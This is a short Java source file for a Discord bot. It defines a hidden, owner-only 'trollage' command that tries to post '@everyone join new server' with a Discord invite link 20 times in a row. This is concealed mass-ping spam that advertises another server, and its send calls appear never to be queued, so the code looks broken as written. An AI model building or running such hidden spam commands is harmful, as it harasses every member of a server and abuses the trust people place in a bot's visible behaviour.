package me.kambing.commands.owner;


import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;

public class TrollageCommand extends Command {
    public TrollageCommand() {
        this.name = "trollage";
        this.help = "kebaboom";
        this.cooldown = 5;
        this.ownerCommand = true;
        this.hidden = true;
    }

    @Override
    protected void execute(CommandEvent e) {
        for (int i = 0; i < 20; i++) {
            e.getTextChannel().sendMessage("@everyone join new server https://discord.gg/8FDGwSzcxn");

        }
    }

}